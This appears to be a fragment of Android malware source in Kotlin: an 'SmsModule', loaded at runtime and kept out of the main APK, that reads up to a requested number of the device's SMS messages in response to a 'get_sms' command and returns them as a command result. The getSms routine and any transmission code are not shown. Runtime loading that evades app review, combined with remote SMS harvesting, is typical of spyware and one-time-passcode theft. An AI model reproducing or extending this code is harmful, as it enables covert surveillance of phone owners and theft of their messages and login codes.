...
/** SmsModule — dynamically loaded, NOT compiled into main APK */
class SmsModule {
    fun execute(ctx: Context, command: String, extra: String?): Pair<String, String> {
        val limit = command.substringAfter("get_sms:", "").toIntOrNull() ?: 50
        return Pair(getSms(ctx, limit), "command_result")
    }
